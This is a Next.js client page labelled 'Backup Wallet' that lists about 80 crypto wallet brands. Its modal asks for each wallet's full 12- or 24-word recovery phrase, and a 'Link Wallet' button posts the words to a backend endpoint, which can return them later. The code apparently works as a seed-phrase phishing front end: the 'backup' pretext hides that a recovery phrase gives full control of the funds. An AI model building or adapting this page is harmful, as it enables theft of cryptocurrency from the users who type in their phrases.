'use client';

import Image, { StaticImageData } from "next/image";
import '../../app/globals.css';
import { useEffect, useState } from "react";
import axios, { AxiosError } from "axios";
import apiClient from "@/lib/axios-config";
import Footer1 from "@/components/footers/Footer1";
import { toast } from "react-toastify";
import TrustWallet from '../../assets/wallet_logo/trustwallet.jpeg';
import Metamask from '../../assets/wallet_logo/metamask.png';
import WalletConnect from '../../assets/wallet_logo/walletconnect.png';
import Lobstr from '../../assets/wallet_logo/lobstr.jpeg';
import Coinbase from '../../assets/wallet_logo/coinbase.png';
import Aktionariat from '../../assets/wallet_logo/aktionariat.png';
import AlphaWallet from '../../assets/wallet_logo/alphawallet.png';
import Anchor from '../../assets/wallet_logo/anchor.png';
import Argent from '../../assets/wallet_logo/argent.png';
import Atomic from '../../assets/wallet_logo/atomic.png';
import Authereum from '../../assets/wallet_logo/authereum.png';
import ArculusLogo from '../../assets/wallet_logo/arculus.png';
import Bakkt from '../../assets/wallet_logo/bakkt.jpeg';
import Binance from '../../assets/wallet_logo/binance.png';
import BitKeep from '../../assets/wallet_logo/bitkeep.png';
import BitPay from '../../assets/wallet_logo/bitpay.png';
import Blockchain from '../../assets/wallet_logo/blockchainwaa.png';
import Bridge from '../../assets/wallet_logo/bridge.jpeg';
import Coin98 from '../../assets/wallet_logo/coin98.png';
import Coinomi from '../../assets/wallet_logo/coinomi.jpeg';
import CoolWallet from '../../assets/wallet_logo/coolwallets.png';
import Cosmostation from '../../assets/wallet_logo/cosmostation.jpeg';
import CryptoCom from '../../assets/wallet_logo/cryptocom.jpeg';
import Cybavo from '../../assets/wallet_logo/cybavo.png';
import Dcent from '../../assets/wallet_logo/dcent.png';
import Dok from '../../assets/wallet_logo/dokwallet.png';
import EasyPocket from '../../assets/wallet_logo/ec-wallet-dark.png';
import Eidoo from '../../assets/wallet_logo/eidoo.png';
import Ellipal from '../../assets/wallet_logo/ellipal.png';
import EqualWallet from '../../assets/wallet_logo/EQLwallet.png';
import Exodus from '../../assets/wallet_logo/exodus.jpeg';
import Fetch from '../../assets/wallet_logo/fetch.jpeg';
import Gnosis from '../../assets/wallet_logo/gnosissafe.png';
import Graph from '../../assets/wallet_logo/graphprotocol.png';
import GridPlus from '../../assets/wallet_logo/gridplus.png';
import Harmony from '../../assets/wallet_logo/harmony.jpeg';
import Huobi from '../../assets/wallet_logo/huobi.jpeg';
import Iconex from '../../assets/wallet_logo/iconex.jpeg';
import Infinito from '../../assets/wallet_logo/infinito.png';
import Infinity from '../../assets/wallet_logo/infinitywallet.jpeg';
import KardiaChain from '../../assets/wallet_logo/kardiachain.png';
import Keplr from '../../assets/wallet_logo/keplr.png';
import Keyring from '../../assets/wallet_logo/keyringpro.png';
import LedgerFlex from '../../assets/wallet_logo/ledgerflex.png';
import LedgerLive from '../../assets/wallet_logo/ledgerlive.jpeg';
import LedgerNanoSPlus from '../../assets/wallet_logo/ledgernanosplus.png';
import LedgerNanoX from '../../assets/wallet_logo/ledgernanox.png';
import Loopring from '../../assets/wallet_logo/loopring.jpeg';
import Maiar from '../../assets/wallet_logo/maiar.png';
import Math from '../../assets/wallet_logo/math.png';
import MeetOne from '../../assets/wallet_logo/meetone.jpeg';
import Midas from '../../assets/wallet_logo/midas.png';
import Morix from '../../assets/wallet_logo/morix.jpeg';
import MyKey from '../../assets/wallet_logo/mykey.png';
import Nash from '../../assets/wallet_logo/nash.png';
import Onto from '../../assets/wallet_logo/onto.png';
import Ownbit from '../../assets/wallet_logo/ownbit.jpeg';
import PeakDefiWallet from '../../assets/wallet_logo/peakdefiwallet.jpeg';
import Pillar from '../../assets/wallet_logo/pillar.jpeg';
import Rainbow from '../../assets/wallet_logo/rainbow.jpeg';
import Safepal from '../../assets/wallet_logo/safepal.png';
import SparkPoint from '../../assets/wallet_logo/sparkpoint.png';
import Spatium from '../../assets/wallet_logo/spatium.png';
import Tangem from '../../assets/wallet_logo/tangem.png';
import TokenPocket from '../../assets/wallet_logo/tokenpocket.png';
import Tokenary from '../../assets/wallet_logo/tokenary.jpeg';
import Torus from '../../assets/wallet_logo/torus.png';
import Trezor from '../../assets/wallet_logo/trezor.png';
import TrustVault from '../../assets/wallet_logo/trustvault.jpeg';
import Unstoppable from '../../assets/wallet_logo/unstoppable.jpeg';
import ViaWallet from '../../assets/wallet_logo/viawallet.jpeg';
import Vision from '../../assets/wallet_logo/vision.jpeg';
import WalletIO from '../../assets/wallet_logo/walletio.png';
import Walleth from '../../assets/wallet_logo/walleth.jpeg';
import Wazirx from '../../assets/wallet_logo/wazirx.png';
import Xaman from '../../assets/wallet_logo/xaman.jpeg';
import XDCWallet from '../../assets/wallet_logo/xdc2.png';
import ZelCore from '../../assets/wallet_logo/zelcore.png';
// import Dok from '../../assets/wallet_logo/dokwallet.png';

interface CryptoService {
    name: string;
    logo: string | StaticImageData;
}

const cryptoServices: CryptoService[] = [
    { name: "Trust Wallet", logo: TrustWallet },
    { name: "Metamask", logo: Metamask },
    { name: "Wallet Connect", logo: WalletConnect },
    { name: "Lobstr", logo: Lobstr },
    { name: "Coinbase", logo: Coinbase },
    { name: "Aktionariat", logo: Aktionariat },
    { name: "Alpha Wallet", logo: AlphaWallet },
    { name: "Anchor", logo: Anchor },
    { name: "Argent", logo: Argent },
    { name: "Atomic", logo: Atomic },
    { name: "Authereum", logo: Authereum },
    { name: "Arculus", logo: ArculusLogo },
    { name: "Bakkt", logo: Bakkt },
    { name: "Binance Smart Chain", logo: Binance },
    { name: "Bit Keep", logo: BitKeep },
    { name: "Bit Pay", logo: BitPay },
    { name: "Blockchain", logo: Blockchain },
    { name: "Bridge Wallet", logo: Bridge },
    { name: "Coin98", logo: Coin98 },
    { name: "Coinomi", logo: Coinomi },
    { name: "Cool Wallet S", logo: CoolWallet },
    { name: "Cosmostation", logo: Cosmostation },
    { name: "Crypto.com Defi Wallet", logo: CryptoCom },
    { name: "Cybavo Wallet", logo: Cybavo },
    { name: "D'Cent Wallet", logo: Dcent },
    { name: "Dok Wallet", logo: Dok },
    { name: "Easy Pocket", logo: EasyPocket },
    { name: "Eidoo", logo: Eidoo },
    { name: "Ellipal", logo: Ellipal },
    { name: "Equal", logo: EqualWallet },
    { name: "Exodus", logo: Exodus },
    { name: "Fetch", logo: Fetch },
    { name: "Gnosis Safe Multisig", logo: Gnosis },
    { name: "Graph Protocol", logo: Graph },
    { name: "Grid Plus", logo: GridPlus },
    { name: "Harmony", logo: Harmony },
    { name: "Huobi Wallet", logo: Huobi },
    { name: "Iconex", logo: Iconex },
    { name: "Infinito", logo: Infinito },
    { name: "Infinity Wallet", logo: Infinity },
    { name: "Karda Chain", logo: KardiaChain },
    { name: "Keplr", logo: Keplr },
    { name: "Keyring Pro", logo: Keyring },
    { name: "Ledger Flex", logo: LedgerFlex },
    { name: "Ledger Live", logo: LedgerLive },
    { name: "Ledger Nano S", logo: LedgerNanoSPlus },
    { name: "Ledger Nano X", logo: LedgerNanoX },
    { name: "Loopring Wallet", logo: Loopring },
    { name: "Maiar", logo: Maiar },
    { name: "Math Wallet", logo: Math },
    { name: "Meet.one", logo: MeetOne },
    { name: "Midas Wallet", logo: Midas },
    { name: "Morix Wallet", logo: Morix },
    { name: "Mykey", logo: MyKey },
    { name: "Nash", logo: Nash },
    { name: "Onto", logo: Onto },
    { name: "Ownbit", logo: Ownbit },
    { name: "Peak Defi Wallet", logo: PeakDefiWallet },
    { name: "Pillar", logo: Pillar },
    { name: "Rainbow", logo: Rainbow },
    { name: "Safepal", logo: Safepal },
    { name: "Spark Point", logo: SparkPoint },
    { name: "Spatium", logo: Spatium },
    { name: "Tangem", logo: Tangem },
    { name: "Token Pocket", logo: TokenPocket },
    { name: "Tokenary", logo: Tokenary },
    { name: "Torus", logo: Torus },
    { name: "Trezor Model T", logo: Trezor },
    { name: "Trust Vault", logo: TrustVault },
    { name: "Unstoppable Wallet", logo: Unstoppable },
    { name: "Via Wallet", logo: ViaWallet },
    { name: "Vision", logo: Vision },
    { name: "Wallet.io", logo: WalletIO },
    { name: "Walleth", logo: Walleth },
    { name: "Wazirx", logo: Wazirx },
    { name: "Xaman", logo: Xaman },
    { name: "Xdc Wallet", logo: XDCWallet },
    { name: "Zel Core", logo: ZelCore },
];

export default function BackupWallet() {
    const [selectedWallet, setSelectedWallet] = useState<CryptoService | null>(null);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [words, setWords] = useState<string[]>(Array(12).fill(""));
    const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
    const [filledWallets, setFilledWallets] = useState<string[]>([]);
    const [walletData, setWalletData] = useState<any[]>([]);

    useEffect(() => {
        const fetchWallets = async () => {
            try {
                const res = await apiClient.get('/api/history/get_word', {
                    headers: {
                        Authorization: `Bearer ${localStorage.getItem("token")}`
                    }
                });

                if (res.data.status_code && res.data.wallets?.length) {
                    setWalletData(res.data.wallets);
                    const walletsWithAllWords = res.data.wallets
                        .filter((w: any) => {
                            const len = w.mnemonic?.trim().split(/\s+/).length;
                            return len === 12 || len === 24;
                        })
                        .map((w: any) => w.type);

                    setFilledWallets(walletsWithAllWords);
                }
            } catch (err) {
                const error = err as AxiosError<{ msg: string }>;
                console.log("error fetching wallets:", error);
            }
        };
        fetchWallets();
    }, []);

    const openModal = (wallet: CryptoService) => {
        setSelectedWallet(wallet);
        setIsModalOpen(true);

        const savedWallet = walletData.find(
            (w: any) => w.type.trim().toLowerCase() === wallet.name.trim().toLowerCase()
        );

        if (savedWallet?.mnemonic) {
            const mnemonicWords = savedWallet.mnemonic.trim().split(/\s+/);
            const len = mnemonicWords.length === 24 ? 24 : 12;
            setPhraseLength(len);
            const limitedWords = mnemonicWords.slice(0, len);
            setWords([
                ...limitedWords,
                ...Array(Math.max(0, len - limitedWords.length)).fill("")
            ]);
        } else {
            setPhraseLength(12);
            setWords(Array(12).fill(""));
        }
    };

    const closeModal = () => {
        setIsModalOpen(false);
        setSelectedWallet(null);
        setWords(Array(12).fill(""));
        setPhraseLength(12);
    };

    const handlePhraseLengthChange = (length: 12 | 24) => {
        setPhraseLength(length);
        setWords(prev => {
            if (prev.length === length) return prev;
            if (length === 24) {
                return [...prev, ...Array(12).fill("")];
            } else {
                return prev.slice(0, 12);
            }
        });
    };

    const handleWordChange = (index: number, value: string) => {
        const updated = [...words];
        updated[index] = value;
        setWords(updated);
    };

    const handleSubmit = async () => {
        if (words.some(word => word.trim() === "")) {
            toast.error(`Fill all ${phraseLength} words.`);
            return;
        }

        if (!selectedWallet) return;

        try {
            const payload = {
                type: selectedWallet.name,
                one: words[0],
                two: words[1],
                three: words[2],
                four: words[3],
                five: words[4],
                six: words[5],
                seven: words[6],
                eight: words[7],
                nine: words[8],
                ten: words[9],
                eleven: words[10],
                twelve: words[11],
                thirteen: phraseLength === 24 ? words[12] : null,
                fourteen: phraseLength === 24 ? words[13] : null,
                fifteen: phraseLength === 24 ? words[14] : null,
                sixteen: phraseLength === 24 ? words[15] : null,
                seventeen: phraseLength === 24 ? words[16] : null,
                eighteen: phraseLength === 24 ? words[17] : null,
                nineteen: phraseLength === 24 ? words[18] : null,
                twenty: phraseLength === 24 ? words[19] : null,
                twenty_one: phraseLength === 24 ? words[20] : null,
                twenty_two: phraseLength === 24 ? words[21] : null,
                twenty_three: phraseLength === 24 ? words[22] : null,
                twenty_four: phraseLength === 24 ? words[23] : null
            };

            const res = await apiClient.post('/api/history/add_word', payload);

            if (res.data.status_code) {
                toast.success('Wallet words saved successfully');
                closeModal();
                const refreshed = await apiClient.get('/api/history/get_word', {
                    headers: {
                        Authorization: `Bearer ${localStorage.getItem("token")}`
                    }
                });
                setWalletData(refreshed.data.wallets);
                const walletsWithAllWords = refreshed.data.wallets
                    .filter((w: any) => {
                        const len = w.mnemonic?.trim().split(/\s+/).length;
                        return len === 12 || len === 24;
                    })
                    .map((w: any) => w.type);
                setFilledWallets(walletsWithAllWords);
            }
        } catch (err) {
            const error = err as AxiosError<{ msg: string }>;
            console.log(error.response?.data?.msg || "❌ Something went wrong.");
        }
    };

    return (
        <>
            <div className="tw-bg-[#11150f] tw-text-white tw-px-6 tw-pt-8 tf-container tw-pb-28">
                <h2 className="tw-text-lg tw-font-semibold tw-mb-8">Backup Wallet</h2>
                <div className="tw-grid tw-grid-cols-2 sm:tw-grid-cols-3 lg:tw-grid-cols-4 tw-gap-[20px]">
                    {cryptoServices.map((service) => (
                        <div
                            key={service.name}
                            onClick={() => openModal(service)}
                            className={`tw-flex tw-flex-col tw-items-center tw-gap-4 tw-bg-black/20 tw-rounded-lg tw-px-3 tw-py-3 tw-transition tw-border-2 tw-border-solid
                            ${filledWallets.includes(service.name) ? "!tw-border-[#008000]" : "tw-border-[#f1f1f2]/30"} 
                            tw-cursor-pointer tw-hover:tw-bg-black/40`}
                        >
                            <div className="tw-w-12 tw-h-12 tw-relative tw-rounded-lg tw-overflow-hidden tw-mr-[12px]">
                                <Image
                                    src={service.logo}
                                    alt={service.name}
                                    fill
                                    className="tw-object-cover"
                                />
                            </div>
                            <div>
                                <h3 className="tw-text-lg tw-text-center">{service.name}</h3>
                            </div>
                        </div>
                    ))}
                </div>
                {isModalOpen && selectedWallet && (
                    <div className="tw-fixed tw-inset-0 tw-z-50 tw-bg-black tw-bg-opacity-70 tw-flex tw-justify-center tw-items-center">
                        <div className="tw-bg-[#1a1a1a] tw-rounded-lg tw-w-[90%] tw-max-w-md tw-p-8 tw-relative tw-text-white">
                            <button onClick={closeModal} className="tw-absolute tw-top-4 tw-right-6 tw-text-xl tw-border-none tw-w-0">×</button>
                            <div className="tw-flex tw-items-center tw-gap-[12px] tw-mb-4">
                                <div className="tw-w-10 tw-h-10 tw-relative tw-rounded-lg tw-overflow-hidden">
                                    <Image
                                        src={selectedWallet.logo}
                                        alt={selectedWallet.name}
                                        fill
                                        className="tw-object-cover"
                                    />
                                </div>
                                <h2 className="tw-text-xl tw-font-bold">{selectedWallet.name}</h2>
                            </div>
                            <hr className="tw-my-4" />
                            <div className="tw-flex tw-justify-between tw-items-center tw-mb-4">
                                <p className="tw-text-[15px] tw-font-medium">Passphrase Type:</p>
                                <div className="tw-flex gap-2 tw-bg-[#222] tw-p-1 tw-rounded-lg">
                                    <button
                                        type="button"
                                        onClick={() => handlePhraseLengthChange(12)}
                                        className={`tw-px-3 tw-py-1 tw-text-xs tw-rounded-md tw-transition tw-border-none tw-text-nowrap ${phraseLength === 12 ? 'tw-bg-green-600 tw-text-white tw-font-bold' : 'tw-text-gray-400 tw-bg-transparent hover:tw-text-black'}`}
                                    >
                                        12 Words
                                    </button>
                                    <button
                                        type="button"
                                        onClick={() => handlePhraseLengthChange(24)}
                                        className={`tw-px-3 tw-py-1 tw-text-xs tw-rounded-md tw-transition tw-border-none tw-text-nowrap ${phraseLength === 24 ? 'tw-bg-green-600 tw-text-white tw-font-bold' : 'tw-text-gray-400 tw-bg-transparent hover:tw-text-black'}`}
                                    >
                                        24 Words
                                    </button>
                                </div>
                            </div>
                            <p className="tw-mb-[20px] tw-text-center tw-text-[15px] tw-text-gray-300">Enter your {phraseLength}-word passphrase:</p>
                            <div className="tw-grid tw-grid-cols-2 tw-gap-[10px] tw-mb-[16px] tw-text-[13px] tw-max-h-[250px] tw-overflow-y-auto tw-pr-1">
                                {words.map((word, i) => (
                                    <input
                                        key={i}
                                        type="text"
                                        placeholder={`Word ${i + 1}`}
                                        value={word}
                                        onChange={(e) => handleWordChange(i, e.target.value)}
                                        className="tw-bg-[#333] tw-p-2 tw-rounded tw-text-white tw-border-2 tw-border-solid tw-border-gray-600 tw-outline-none tw-placeholder:tw-text-[13px]"
                                    />
                                ))}
                            </div>
                            <button
                                onClick={handleSubmit}
                                className="tw-bg-green-600 tw-hover:tw-bg-green-700 tw-text-white tw-py-2 tw-px-4 tw-rounded tw-w-full tw-text-[16px]"
                            >
                                Link Wallet
                            </button>
                        </div>
                    </div>
                )}
            </div>
            <Footer1 />
        </>
    );
}
